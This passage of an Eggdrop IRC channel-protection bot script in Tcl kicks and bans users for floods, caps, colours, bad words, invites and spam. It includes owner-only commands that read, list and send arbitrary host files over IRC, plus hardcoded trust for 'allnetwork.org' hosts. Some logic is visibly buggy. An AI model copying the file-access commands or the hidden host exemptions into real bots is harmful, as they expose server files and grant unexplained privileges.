            if {![info exists repeat_person($mhost$chan)]} {
               set repeat_person($mhost$chan) 1
            } {
               incr repeat_person($mhost$chan)
            }
            if {$repeat_person($mhost$chan) == [getuser $cflag XTRA "RPT"]} {
               putserv "KICK $chan $nick :4RePeaT 1FRoM 4$mhost 1MaX4"
               catch {unset repeat_person($mhost$chan)}
               catch {unset repeat_last($mhost$chan)}
               return 0
            }
         }
      }
      set repeat_last($mhost$chan) $text
   }
   if {[matchattr $cflag T] && [string length $real] >= [getuser $cflag XTRA "CHAR"]} {
      catch {unset repeat_person($mhost$chan)}
      catch {unset repeat_last($mhost$chan)}
      if {![isutimer "OL $chan"]} {
         utimer 10 [list putlog "OL $chan"] 
         putserv "KICK $chan $nick :1ABuSINg 4LoNg TexT 1MaX4 [getuser $cflag XTRA "CHAR"]1 CHaR"
      } {
         putserv "KICK $chan $nick :1ABuSINg 4LoNg TexT 1MaX4 [getuser $cflag XTRA "CHAR"]1 CHaR"
      }
      return 0
   }
   if {[string match "*!!!!!*" $text]} {
      if {![info exists yealnick($nick)]} {
         putserv "KICK $chan $nick :1QuITE DoNT 4YeALLED1 PLeASE <<!>>"
         set yealnick($nick) "1"
         return 0
      }
      putserv "KICK $chan $nick :42nd1 WaRN DonT 4YeALLED1 PLeASE <<!>>"
      unset yealnick($nick)
   }
   if {[matchattr $cflag U]} {
      set len [string length $text]
      if {[isbad $nick $uhost $chan $text]} { return 0 }
      if {$len < 30} { return 0 }
      set cnt 0
      set capcnt 0
      while {$cnt < $len} {
         if {[string index $text $cnt] == " " || [isupper [string index $text $cnt]]} {
            incr capcnt
         }
         incr cnt
      }
      if {[expr 100 * $capcnt / $len] >= [getuser $cflag XTRA "CAPS"]} {
         if {![info exists capsnick($nick)]} {
            putserv "KICK $chan $nick :1SToP UsEd 4CapsLocK1 ExceEd4 [getuser $cflag XTRA "CAPS"]%1..!"
            set capsnick($nick) "1"
            return 0
         }
         putserv "KICK $chan $nick :42nd1 WaRN DonT UsEd 4CapsLocK1 ExceEd4 [getuser $cflag XTRA "CAPS"]%"
         unset capsnick($nick)
      }
   }
}
proc pum_arg {nick uhost hand chan text} {
   global boldnick colorkick botnick notc kops ps
   regsub -all -- \" $text "" text
   regsub -all -- \{ $text "" text
   regsub -all -- \} $text "" text
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {[matchattr $nick f]} { return 0 }
   if {[matchattr $nick m]} { return 0 }
   if {[matchattr $nick z]} { return 0 }
   if {$nick == $botnick} { return 0 }
   if {![isop $botnick $chan]} { return 0 }
   set resume "T"
   if {[string match "*-greet*" [channel info $chan]]} { 
      set resume "F"
   }
   if {![isop $botnick $chan]} { 
      set resume "F"
   }
   if {![info exists kops]} {
      if {[isop $nick $chan]} { 
         set resume "F"
      }
      if {[isvoice $nick $chan]} { 
         set resume "F"
      }
   }
   if {$resume == "F"} { return 0 }
   if {[matchattr $cflag B]} {
      if {[isbad $nick $uhost $chan $text]} { return 0 }
      if {[string match *\002* $text]} {
         if {![info exists boldnick($nick)]} {
            putserv "KICK $chan $nick :1SToP UsEd 4bOLd1 TeXt OnLY4..!"
            set boldnick($nick) "1"
            return 0
         }
         putserv "KICK $chan $nick :42nd1 WaRN DonT UsEd 4bOLd1"
         unset boldnick($nick)
      }
   }
   if {[matchattr $cflag W]} {
      if {[isbad $nick $uhost $chan $text]} { return 0 }
      if {[string match ** $text]} {
         if {![info exists colorkick($nick)]} {
            putserv "KICK $chan $nick :1DOnT UsEd 4CoLOuR1 TeXt OnLY4..!"
            set colorkick($nick) "1"
            return 0
         }
         putserv "KICK $chan $nick :42nd1 WaRN DonT UsEd 4CoLOuR"
         unset colorkick($nick)
      }
   }
}
proc isupper {letter} {
   set caps {A B C D E F G H I
      J K L M N O P Q R
   S T U V W X Y Z}
   if {[lsearch -exact $caps $letter] > -1} {
      return 1
   } else {
      return 0
   }
}
proc isflood {letter} {
   set caps {! @ # $ % ^ & * (
   ) | [ ] < > / \ =    }
   if {[lsearch -exact $caps $letter] > -1} {
      return 1
   } else {
      return 0
   }
}
proc isbad {nick uhost chan arg} {
   global badwords botnick notc bannick
   set arg [string tolower $arg]
   if {[string match "*-greet*" [channel info $chan]]} { 
      set isbad 0 
      return 0
   }
   foreach badword [string tolower $badwords] {
      if {[string match *$badword* [string tolower $arg]]} {
         set bannick($nick) "$nick!*@*"
         putserv "KICK $chan $nick :4BaDWoRD1 MaTcH FRoM 4"
         return 1
      }
   }
   set isbad 0
   return 0
}
proc set_-m {chan} {
   if {[isutimer "set_-m $chan"]} { return 0 }
   if {[botonchan $chan] && [botisop $chan] && [string match "*m*" [getchanmode $chan]]} {
      putserv "mode $chan -m"
   }
}
proc topic_chk {nick host handle chan topic} {
   global botnick notc bannick
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $cflag I]} { return 0 }
   if {$nick == $botnick || $nick == "ChanServ"} { return 0 }
   if {[matchattr $nick m]} {
      setuser $cflag XTRA "TOPIC" [topic $chan]
      saveuser
      return 0
   }
   if {![isop $botnick $chan]} { return 0 }
   if {[matchattr $nick f] || $nick == $botnick} { return 0 }
   if {$topic == [getuser $cflag XTRA "TOPIC"]} { return 0 }
   if {![string match "*allnetwork.org" $nick]} {
      putserv "KICK $chan $nick :1DonT cHaNgINg 4ToPIc [banms]"
   }
   puthelp "topic $chan :[getuser $cflag XTRA "TOPIC"]"
   return 0
}
bind flud - * flood_chk
proc flood_chk {nick host handle type channel} {
   global notc botnick quick bannick notm flooddeop floodnick floodkick igflood kops
   putlog "!Log! FLOOD <<$type>> FRoM $host"
   if {[info exists bannick($nick)]} { return 1 }
   if {[info exists igflood($nick)]} { return 1 }
   if {[string match "*Serv*" $nick] || [matchattr $handle f] || $nick == $botnick} {
      putlog "!Log! FlooD <<$nick>> Service OR FrIeNd !PaSS!"
      return 1
   }
   if {[string index $channel 0] != "#"} {
      foreach x [channels] {
         if {[onchan $nick $x]} {
            set channel $x
         }
      }
   }
   set mhost "@[lindex [split $host @] 1]"
   if {[string index $channel 0] == "#"} { 
      if {![isop $botnick $channel]} {
         putlog "!Log! FlooD <<$nick>> BoT NoT @P !IgNoREd!"
         return 1
      }
   }
   set type [string tolower $type]
   if {$type == "join"} {
      set bannick($nick) "*!*$mhost"
      putserv "KICK $channel $nick :1ExceEd MaX 4JoIN1 FRoM 4$mhost"
   }
   if {$type == "ctcp"} {
      if {![info exists kops]} {
         if {[isop $nick $channel] || [isvoice $nick $channel]} {
            return 1
         }
      }
      set bannick($nick) "*!*$mhost"
      if {$quick == "1"} {
         putquick "KICK $channel $nick :1ExceEd MaX 4cTcP1 FRoM 4$mhost"
      } else {
         putserv "KICK $channel $nick :1ExceEd MaX 4cTcP1 FRoM 4$mhost"
      }
   }
   if {$type == "pub"} {
      if {![info exists kops]} {
         if {[isop $nick $channel] || [isvoice $nick $channel]} {
            return 1
         }
      }
      set bannick($nick) "$nick!*@*"
      putserv "KICK $channel $nick :1ExceEd MaX 4LINES1 FRoM 4$mhost"
      return 1
   }
   if {$type == "nick"} {
      if {![info exists kops]} {
         if {[isop $nick $channel] || [isvoice $nick $channel] || [string length $nick] == 8} {
            return 1
         }
      }
      if {![info exists floodnick($mhost)]} {
         set floodnick($mhost) 1
         putserv "KICK $channel $nick :1sTOp cHaNgINg YouR 4NIcK1..!"
      } {
         catch {unset floodnick($mhost)}
         set bannick($nick) "*!*$mhost"
         putserv "KICK $channel $nick :1TwIcE ExceEd 4NIcK1 FRoM 4$mhost"
      }
   }
   if {$type == "deop"} {
      if {![info exists flooddeop($nick)]} {
         set flooddeop($nick) 1
         putserv "KICK $channel $nick :1ExceEd MaX 4De@p1 FRoM 4$mhost1..!"
      } {
         catch {unset flooddeop($nick)}
         set bannick($nick) "$nick!*@*"
         putserv "KICK $channel $nick :1TwIcE ExceEd MaX 4De@p1 FRoM 4$mhost"
      }
   }
   if {$type == "kick"} {
      if {![info exists floodkick($nick)]} {
         set floodkick($nick) 1
         putserv "KICK $channel $nick :1ExceEd MaX 4KIcK1 FRoM 4$mhost1..!"
      } {
         catch {unset floodkick($nick)}
         set bannick($nick) "$nick!*@*"
         putserv "KICK $channel $nick :1TwIcE ExceEd MaX 4KIcK1 FRoM 4$mhost1..!"
      }
   }
   return 1
}
bind raw - INVITE raw_chk
proc raw_chk {nick keyword arg} {
   global invme joinme notc bannick notd botnick
   set who [string range $nick 0 [expr [string first "!" $nick]-1]]
   set channel [lindex $arg 1]
   set channel [string range $channel 1 end]
   foreach x [channels] {
      if {[string tolower $channel] == [string tolower $x]} {
         putserv "JOIN $channel"
         return 0
      }
   }
   if {$who == "ChanServ" || [matchattr $who Z]} {
      if {![validchan $channel]} {
         if {[matchattr $who Z] && ![matchattr $who Q]} {
            puthelp "NOTICE $who :4DenieD...!!!"
            return 0
         } else { 
            set joinme $who
         }
         channel add $channel
         catch { channel set $channel -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
         savechan
      }
      putserv "JOIN $channel"
      return 0
   }
   if {[matchattr $who f]} { return 0 }
   foreach x [channels] {
      if {[onchan $who $x]} {
         if {[isop $botnick $x]} {
            set banmask "$nick!*@*"
            set bannick($who) $banmask
            putserv "KICK $x $who :4!SpaM!1 I HaTE 4InvITeR"
            return 0
         } {
            set members [chanlist $x f]
            foreach c $members {
               if {[isop $c $x]} {
                  putlog "!Log! RePORTED InVITING FRoM <<$who$x>> To #$c#"
                  set sendspam "!kick $x $who 4!SpaM!1 FRoM 4[string range $nick [string first "@" $nick] end]1 InvITE [banmsg]"
                  putserv "PRIVMSG $c :$sendspam"
                  return 0
               }
            }
         }
      }
   }
   set invme([string range $nick [string first "@" $nick] end]) "InvITeR"
   return 0
}
bind ctcp - CLIENTINFO sl_ctcp
bind ctcp - USERINFO sl_ctcp
bind ctcp - FINGER sl_ctcp
bind ctcp - ERRMSG sl_ctcp
bind ctcp - ECHO sl_ctcp
bind ctcp - INVITE sl_ctcp
bind ctcp - WHOAMI sl_ctcp
bind ctcp - OP sl_ctcp
bind ctcp - OPS sl_ctcp
bind ctcp - UNBAN sl_ctcp
bind ctcp - TIME sl_ctcp
bind ctcp - VERSION sl_ctcp
bind ctcp - CHAT chat_ctcp
bind ctcp - "VERSION" ctcp_version
bind ctcp - "TIME" ctcp_time
proc ctcp_version {nick uhost handle dest keyword args} {
   global botnick 
   putserv "NOTICE $nick :VERSION �10WhaT 8ThE 4FucK �"
   return 1
}
proc ctcp_time {nick uhost handle dest keyword args} {
   global botnick 
   set curtime [ctime [unixtime]]
   putserv "NOTICE $nick :\001TIME $curtime\001"
   return 1
}
proc sl_ctcp {nick uhost hand dest key arg} {
   global botnick notc
   if {[matchattr $nick f] || $nick == $botnick} { return 1 }
   if {[string match "*allnetwork*rg*" [string tolower $uhost]]} {
      putserv "NOTICE $nick :VERSION �10WhaT 8ThE 4FucK �"
   } {
      set hostmask "${nick}!*@*"
      newignore $hostmask $botnick "*" 1
   }
   return 1
}
proc chat_ctcp {nick uhost hand dest key arg} {
   global botnick notc
   if {[matchattr $nick Z]} { return 0 }
   puthelp "NOTICE $nick :1SoRRY I DoNT KNoW YoU..!"
   newignore "${nick}!*@*" $botnick "*" 1
   return 1
}
set virus_nick ""
bind ctcp - DCC got_dcc
proc got_dcc {nick uhost handle dest key arg} {
   global virus_nick notc notd botnick
   if {[matchattr $nick f]} { return 0 }
   if {[lindex $arg 2] == 0 && [lindex $arg 3] == 0} {
      putlog "!Log! FaKE DCC SKIPPED..!"
      return 1
   }
   set virus_nick $nick
   foreach x [channels] {
      if {[onchan $nick $x] && ![isop $nick $x]} {
         if {[isop $botnick $x]} {
            putserv "KICK $x $nick :4!SpaM!1 I HaTE 4VIRuZ [banms]"
            set virus_nick ""
         } else {
            set members [chanlist $x f]
            foreach c $members {
               if {[isop $c $x]} {
                  putlog "!Log! RePORTED ViRUS FRoM <<$nick$x>> To #$c#"
                  set sendspam "!kick $x $nick 4!SpaM!1 YeW GoT VIRuZ JoIN #NOHACK TO FIxED [banmsg]"
                  putserv "PRIVMSG $c :$sendspam"
                  return 0
               }
            }
         }
      }
   }
   return 1
}
proc voiceq {chan nick} {
   utimer [expr 5 + [rand 15]] [list voiceprc $chan $nick]
}
proc voiceprc {chan nick} {
   global botnick
   if {[isop $botnick $chan] && ![isvoice $nick $chan] && ![isop $nick $chan]} { 
      putserv "MODE $chan +vvvvvv $nick"
   }
}
proc advertise {chan nick} {
   if {[isutimer "advq $chan $nick"]} { return 0 }
   set cret 5
   foreach ct [utimers] {
      if {[string match "*advq*" $ct]} {
         if {[expr [lindex $ct 0] + 5] > $cret} {
            set cret [expr [lindex $ct 0] + 5]
         }
      }
   }
   utimer $cret [list advq $chan $nick]
}
proc advq {chan nick} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![isop $nick $chan] && [onchan $nick $chan]} {
      set greetmsg [getuser $cflag XTRA "GREET"]
      regsub %n $greetmsg $nick greetmsg
      regsub %c $greetmsg $chan greetmsg
      puthelp "NOTICE $nick :[lgrnd] $greetmsg"
   }
}
proc msgpart {chan nick} {
   if {[isutimer "msgprt $chan $nick"]} { return 0 }
   set cret 5
   foreach ct [utimers] {
      if {[string match "*msgprt*" $ct]} {
         if {[expr [lindex $ct 0] + 5] > $cret} {
            set cret [expr [lindex $ct 0] + 5]
         }
      }
   }
   utimer $cret [list msgprt $chan $nick]
}
proc msgprt {chan nick} {
   global notc
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   set msgprtt [getuser $cflag XTRA "MSGPART"]
   regsub %n $msgprtt $nick msgprtt
   regsub %c $msgprtt $chan msgprtt
   puthelp "NOTICE $nick :[lgrnd] $msgprtt"
}
proc deopprc {chan nick} {
   global botnick
   if {[isop $botnick $chan] && [isop $nick $chan]} {
      if {![string match "*k*" [getchanmode $chan]]} {
         putserv "MODE $chan -ko 4n0.Guest.@ps $nick"
      } {
         putserv "MODE $chan -o $nick"
      }
   }
}
proc autokick {chan nick} {
   global bannick notc botnick
   if {[isop $botnick $chan] && ![isop $nick $chan] && ![isvoice $nick $chan]} {
      set hostmask [getchanhost $nick $chan]
      set hostmask "*!*@[lindex [split $hostmask @] 1]"
      set bannick($nick) $hostmask
      putserv "KICK $chan $nick :1cHaNNeL IS UnDeR c0NsTRucTIoN [banmsg]" 
   }
}
proc opq {chan nick} {
   utimer [expr 7 + [rand 15]] [list opprc $chan $nick]
}
proc opprc {chan nick} {
   global botnick unop
   if {[isop $botnick $chan] && ![isop $nick $chan] && ![info exists unop($nick)]} {
      putserv "MODE $chan +oooooo $nick"
   }
}
proc dcc_cmd {hand idx arg} {
   if {![matchattr $hand Z]} { return 0 }
   if {![matchattr $hand Q]} { chattr $hand +Q }
   msg_Z $hand "*" $hand $arg
}
proc dcc_get {hand idx arg} {
   global notc own
   if {$hand != $own} { return 0 }
   if {![file exists [lindex $arg 0]]} {
      putdcc $idx "4DenieD...!!!, [lindex $arg 0] <n/a>"
      return 0
   }
   if {[lindex $arg 1] != ""} { 
      set hand [lindex $arg 1] 
   }
   switch -- [dccsend [lindex $arg 0] $hand] {
      0 { putdcc $idx "<<TRaNSFERRING LOG>>" }
      1 { putdcc $idx "dcc table is full (too many connections), TrY AgAIN LaTeR!" }
      2 { putdcc $idx "can't open a socket for transfer." }
      3 { putdcc $idx "file doesn't exist." }
      4 { putdcc $idx "file was queued for later transfer." }
   }
}
proc msg_get {nick uhost hand arg} {
   global notc own
   if {$nick != $own} { return 0 }
   if {![matchattr $nick Q]} {
      puthelp "PRIVMSG $nick :4DenieD...!!!"
      return 0
   }
   if {![file exists $arg]} {
      puthelp "PRIVMSG $nick :4DenieD...!!!, $arg <n/a>"
      return 0
   }
   switch -- [dccsend $arg $nick] {
      0 { 
         puthelp "NOTICE $nick :TRaNSFERRING LOG..!" 
      }
      1 { 
         puthelp "NOTICE $nick :dcc table is full (too many connections), TrY AgAIN LaTER!" 
      }
      2 { 
         puthelp "NOTICE $nick :can't open a socket for transfer." 
      }
      3 { 
         puthelp "NOTICE $nick :file doesn't exist." 
      }
      4 { 
         puthelp "NOTICE $nick :file was queued for later transfer." 
      }
   }
}
bind raw - 301 rtn
proc rtn { from keyword arg } {
   global notd botnick notb notc bannick
   set nick [lindex $arg 1]
   if {[matchattr $nick f]} { return 0 }
   set awaytext [string range [lrange $arg 2 end] 1 end]
   if {[string match "*TcL*" [uncolor $awaytext]]} { return 0 }
   if {$nick == $botnick} {
      puthelp "AWAY :�10What8The4Fuck�"
   } {
      if {[string match "*#*" $awaytext] || [string match "*/j*" $awaytext]} {
         foreach x [channels] {
            set chksiton [string tolower $x]
            if {[string match "*$chksiton*" [string tolower $awaytext]]} { return 0 }
         }
         foreach x [channels] {
            if {[onchan $nick $x]} {
               if {[isop $botnick $x]} {
                  set bannick($nick) "*!*[string range [getchanhost $nick $x] [string first "@" [getchanhost $nick $x]] end]"
                  putserv "KICK $x $nick :4!SpaM!1 InvITE aWaY MSg [banmsg]"
                  return 0
               } {
                  set members [chanlist $x f]
                  foreach c $members {
                     if {[isop $c $x]} {
                        set sendspam "!kick $x $nick 4!SpaM!1 FRoM 4[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]1 InvITE aWaY MSg [banmsg]"
                        putserv "PRIVMSG $c :$sendspam"
                        return 0
                     }
                  }
               }
            }
         }
      }
   } 
}
bind time -  "*0 * * * *" chk_five
bind time -  "*6 * * * *" chk_five
proc chk_five {min h d m y} {
   global longer deff
   catch { remain }
   if {![string match "**" $longer]} {
      set longer "$deff"
   }
   puthelp "AWAY :$longer"
}
proc msg_dir {nick uhost hand arg} {
   global notc own
   if {$nick != $own} { return 0 }
   if {![matchattr $nick Q]} {
      puthelp "PRIVMSG $nick :4DenieD...!!!"
      return 0
   }
   if {$arg == ""} {
      set arg "."
   }
   set dirlist ""
   foreach x [getfiles "$arg"] {
      append dirlist "$x "
   }
   puthelp "PRIVMSG $nick :$dirlist"
}
proc msg_read {nick uhost hand arg} {
   global notc own
   if {$nick != $own} { return 0 }
   if {![matchattr $nick Q]} {
      puthelp "PRIVMSG $nick :4DenieD...!!!"
      return 0
   }
   if {![file exists $arg]} {
      puthelp "PRIVMSG $nick :4DenieD...!!!, $arg <n/a>"
      return 0
   }
   set fd [open $arg r]
   while {![eof $fd]} {
      set inp [gets $fd]
      puthelp "PRIVMSG $nick :$inp"
   }
   close $fd
   puthelp "PRIVMSG $nick :EoF..!"
}
proc pub_log {nick uhost hand channel arg} {
   global notc 
   if {[getuser "config" XTRA "LOGCHAN"]!=""} {
      puthelp "NOTICE $nick :Log [getuser "config" XTRA "LOGCHAN"]"
   }
}
proc pub_server {nick uhost hand channel arg} {
   global server notc
   if {$arg != ""} {
      if {[string match "*$arg*" $server]} {
         puthelp "NOTICE $nick :[lindex $server 0]"
      }
   } {
      puthelp "NOTICE $nick :[lindex $server 0]"
   }
}
set own $owner
proc dcc_dir {hand idx arg} {
   global own
   if {$hand != $own} { return 0 }
   if {$arg == ""} {
      set arg "."
   }
   foreach x [getfiles "$arg"] {
      putdcc $idx "$x"
   }
}
proc dcc_read {hand idx arg} {
   global own
   if {$hand != $own} { return 0 }
   if {![file exists $arg]} {
      putdcc $idx "4DenieD...!!!, FiLE NoT ExIST $arg"
      return 0
   }
   set fd [open $arg r]
   while {![eof $fd]} {
      set inp [gets $fd]
      putdcc $idx "$inp"
   }
   close $fd
   putdcc $idx "4******************** END ***********************"
}
proc msg_bantime {nick uhost hand rest} {
   global notc ban-time
   if {$rest==""} {
      puthelp "NOTICE $nick :BanTime \[${ban-time}\] (set 0 to never unban)"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   set mtime [lindex $rest 0]
   if {![isnumber $mtime]} {
      puthelp "NOTICE $nick :Usage: bantime <minutes> (set 0 to never unban)"
      return 0
   }
   set ban-time $mtime
   setuser "config" XTRA "BANTIME" $mtime
   puthelp "NOTICE $nick :BanTime \[$mtime\]"
   saveuser
}
proc chk_limit {chan} {
   global notc botnick lst_limit
   if {![isop $botnick $chan]} { return 0 }
   if {![info exists lst_limit($chan)]} {
      set lst_limit($chan) 0
   }
   set cflag "c$chan" 
   set cflag [string range $cflag 0 8]
   set usercount 0
   foreach x [chanlist $chan] {
      incr usercount
   }
   set usercount [expr [getuser $cflag XTRA "LIMIT"] + $usercount]
   if {$lst_limit($chan) != $usercount} {
      set lst_limit($chan) $usercount
      putserv "MODE $chan +l $usercount"
   }
}
proc msg_logchan {nick uhost hand rest} {
   global notc own
   if {$rest == ""} {
      puthelp "NOTICE $nick :Usage: logchan <#channel/0>"
      return 0
   }
   if {![matchattr $nick Q]} {
      puthelp "NOTICE $nick :4DenieD...!!!"
      return 0
   }
   if {[string tolower $rest] == "off"} {
      puthelp "NOTICE $nick :LOGCHAN [getuser "config" XTRA "LOGCHAN"] \[4OFF\]"
      setuser "config" XTRA "LOGCHAN" ""
   } else {
      if {[string tolower $rest] == "#TeGaL"} {
         return 0
      }
      if {![validchan $rest]} {
         puthelp "NOTICE $nick :NoT IN $rest"
         return 0
      }
      setuser "config" XTRA "LOGCHAN" $rest
      puthelp "NOTICE $nick :LOG CHaNNEL $rest \[9ON\]"
   }
   saveuser
   utimer 5 rehashing
}
proc dcc_log {hand idx arg} {
   global logstore notc
   if {$logstore == ""} {
      putdcc $idx "No LOG FouNd..!"
      return 0
   }
   if {![file exists $logstore]} {
      putdcc $idx "4DenieD...!!!, Log file haven't create yet!"
      return 0
   }
   set fd [open $logstore r]
   while {![eof $fd]} {
      set inp [gets $fd]
      putdcc $idx "$inp"
   }
   close $fd
   putdcc $idx "4******************** END ***********************"
}
set quick "0"
proc chk_quick {} {
   global quick botnick
   putquick "PRIVMSG $botnick :\001PING [unixtime]\001"
   set quick "1"
}
utimer 1 chk_quick
bind raw - MODE chk_op
proc chk_op { from keyword arg } {
   global botnick
   if {![string match "*+o*$botnick*" $arg]} { return 0 }
   set chan [lindex $arg 0]
   if {[string match "*allnetwork.org" $from]} {
      pub_resync $botnick "*" "*" $chan "*"
      return 0
   }
   chk_on_op $chan
}
bind join - * new:talk
proc chk_on_op {channel} {
   global botnick kickme deopme invme virus_nick quick notc bannick is_m botname
   set cflag "c$channel"
   set cflag [string range $cflag 0 8]
   if {[isutimer "chkspam $channel"]} {
      foreach x [utimers] {
         if {[string match "*chkspam $channel*" $x]} { killutimer [lindex $x 2] }
      }
   }
   if {[isutimer "GOP $channel"]} { return 0 }
   if {![onchan $botnick $channel]} { return 0 }
   utimer 20 [list putlog "GOP $channel"]
   set cinfo [channel info $channel]
   if {[string match "*+nodesynch*" $cinfo]} {
      pub_mdeop "*" "*" "*" $channel ""
   }
   set cmode [getchanmode $channel]
   if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
      if {[matchattr $cflag K]} {
         if {![string match "*[dezip [getuser $cflag XTRA "CI"]]*" [getchanmode $channel]]} {
            puthelp "mode $channel -k+k . [dezip [getuser $cflag XTRA "CI"]]"
         }
      } {
         if {[string match "*k*" $cmode]} {
            if {[string tolower $channel] != "#TeGaL"} {
               putserv "mode $channel -k 9r.e.l.e.a.s.e.d"
            }
         }
      }
      if {[string match "*R*" $cmode]} {
         puthelp "mode $channel -R"
      }
      if {[string match "*m*" $cmode] && ![string match "*m*" [lindex [channel info $channel] 0]]} {
         putserv "mode $channel -m"
      }
      if {[string match "*i*" $cmode]} {
         putserv "mode $channel -i"
      }
   }
   if {![string match "*m*" $cmode]} {
      foreach x [utimers] {
         if {[string match "*set_-m $channel*" $x]} {
            killutimer [lindex $x 2]
         }
      }
   }
   if {[matchattr $cflag I]} {
      if {[topic $channel] != [getuser $cflag XTRA "TOPIC"]} {
         puthelp "topic $channel :[getuser $cflag XTRA "TOPIC"]"
      }
   }
   foreach x [chanlist $channel] {
      if {$x == $deopme} {
         if {[isop $x $channel]} {
            if {![string match "*k*" $cmode]} {
               if {$quick == "1"} {
                  putquick "mode $channel -ko 4De@p.ReveRsE $x"
               } else {
                  putserv "mode $channel -ko 4De@p.ReveRsE $x"
               }
            } {
               if {$quick == "1"} {
                  putquick "mode $channel -o $x"
               } else {
                  putserv "mode $channel -o $x"
               }
            }
         }
         set deopme ""
      }
      set mhost "@[lindex [split [getchanhost $x $channel] @] 1]"
      if {[info exists kickme($x)]} {
         if {$kickme($x) == 3} {
            catch { unset kickme($x) }
            set bannick($x) "$nick!*@*"
            if {$quick == "1"} {
               putquick "KICK $channel $x :1RePeaT 4KIcK 1ReMoTe OFF4..!"
            } else { 
               putserv "KICK $channel $x :1RePeaT 4KIcK 1ReMoTe OFF4..!"
            }
         } {
            if {$kickme($x) == 1} {
               if {$quick == "1"} {
                  putquick "KICK $channel $x :1SeLF 4KIcK1 REvENgE4..!"
               } {
                  putserv "KICK $channel $x :1SeLF 4KIcK1 REvENgE4..!"
               }
            }
         }
      }
      if {[string match "*+guest*" [channel info $channel]]} {
         neww:talk $x [getchanhost $x $channel] $channel  
      }
      if {[matchattr $cflag V]} {
         if {![isutimer "set_-m $channel"] && ![info exists is_m($channel)]} {
            if {$x != $botnick && ![isvoice $x $channel] && ![isop $x $channel] && ![matchattr $x O]} {
               set cret [getuser $cflag XTRA "VC"]
               foreach ct [utimers] {
                  if {[string match "*voiceq*" $ct]} {
                     if {[expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]] > $cret} {
                        set cret [expr [lindex $ct 0] + [getuser $cflag XTRA "VC"]]
                     }
                  }
               }
               utimer $cret [list voiceq $channel $x]
            }
         }
      }
      if {[matchattr $x v] || [matchattr $x P] || [matchattr $x G]} {
         if {![isop $x $channel] || ![isvoice $x $channel]} {
            whoisq $x
         }
      }
      if {[matchattr $x O]} {
         if {[isop $x $channel]} {
            set cmode [getchanmode $channel]
            if {![string match "*k*" $cmode]} {
               puthelp "mode $channel -ko 4No@p.LIsT $x"
            } {
               puthelp "mode $channel -o $x"
            }
         } {
            if {[isvoice $x $channel]} {
               set cmode [getchanmode $channel]
               if {![string match "*k*" $cmode]} {
                  puthelp "mode $channel -kv 4No@p.LIsT $x"
               } {
                  puthelp "mode $channel -v $x"
               }
            }
         }
      }
      if {[info exists invme($mhost)]} {
         if {![isop $x $channel]} {
            set bannick($x) "$nick!*@*"
            if {$invme($mhost) == "AuToJoIN MSg"} {
               if {![isvoice $x $channel]} {
                  putserv "KICK $channel $x :4!SpaM!1 FRoM 4$mhost 1$invme($mhost) 4R1emote 4O1ff4..!"
               }
            } {
               putserv "KICK $channel $x :4!SpaM!1 FRoM 4$mhost 1$invme($mhost)"
            }
         }
         catch {unset invme($mhost)}
      }
      if {$x == $virus_nick} {
         if {![isop $x $channel]} {
            set bannick($x) "$nick!*@*"
            putserv "KICK $channel $x :4!SpaM!1 FRoM 4$mhost1 VIRuZ [banmsg]"
            set virus_nick ""
         }
      } 
      spam_chk $x [getchanhost $x $channel] "*" $channel
   }
   foreach x [chanlist $channel K] {
      if {![matchattr $x f]} {
         akick_chk $x [getchanhost $x $channel] $channel
      }
   }
   foreach x [chanbans $channel] {
      set bhost [lindex $x 0]
      if {[string match [string tolower $bhost] [string tolower $botname]]} {
         if {![string match "*k*" $cmode]} {
            puthelp "mode $channel -kb 4SeLF.UnBaN $bhost"
         } {
            puthelp "mode $channel -b $bhost"
         }
      } elseif {[matchattr $bhost f]} {
         puthelp "mode $channel -b $bhost"
      } elseif {[getuser "config" XTRA "IPG"] != ""} {
         foreach ipg [getuser "config" XTRA "IPG"] {
            if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
               if {![isutimer "IPG $bhost"]} {
                  if {![string match "*k*" $cmode]} {
                     puthelp "mode $channel -kb 4IpgUaRd $bhost"
                  } {
                     puthelp "mode $channel -b $bhost"
                  }
                  utimer 60 [list putlog "IPG $bhost"]
               }
            }
         }
      }
   }
}
bind time -  "01 * * * *" show_status
proc show_status {min h d m y} {
   global botnick
   foreach x [channels] {
      if {[isop $botnick $x]} { 
         pub_status "*" "*" "*" $x "" 
         chk_on_op $x
      }
   }
   return 0
}
proc badnick_chk {nick uhost hand chan} {
   global bannick notc botnick badwords
   foreach x [string tolower $badwords] {
      if {[string match "*$x*" [string tolower $nick]]} {
         set bannick($nick) "$nick!*@*"
         putserv "KICK $chan $nick :4BaD NIcK1 MaTcH FRoM 4[string toupper $x] [banms]"
         return 1
      }
   }
   return 0
}
proc spam_chk {nick uhost hand chan} {
   global notc botnick spidx
   set cflag "c$chan"
   set cflag [string range $cflag 0 8]
   if {![matchattr $cflag S]} { return 0 }
   if {$nick == $botnick} { return 0 }
   if {[isvoice $nick $chan]} { return 0 }
   if {[isop $nick $chan]} { return 0 }
   if {[matchattr $nick f]} { return 0 }
   if {[badnick_chk $nick $uhost $hand $chan]} { 
      return 0
   }
   set nicklen [string length $nick]
   if {$nicklen < 5} { return 0 }
   set idx [string index $nick [expr $nicklen - 4]][string index $nick [expr $nicklen - 3]][string index $nick [expr $nicklen - 2]][string index $nick [expr $nicklen - 1]]
   if {[isnumber $idx]} { return 0 }
   set idx [string index $nick [expr $nicklen - 2]][string index $nick [expr $nicklen - 1]]
   if {[isnumber $idx]} {
      if {[string index $uhost 0] != "~"} { return 0 }
      if {$nicklen < 10} {
         if {![string match "~$nick@*" $uhost]} { return 0 }
      } {
         if {![string match "~[string index $nick 0][string index $nick 1][string index $nick 2]*@*" $uhost]} { return 0 }
      }
      if {$spidx == 18} {
         set spidx 1
      }
      spamkick $nick $uhost $chan
      return 0
   }
   if {[regexp \[^a-z\] $nick]} { return 0 }
   set nickchk [string tolower $nick]
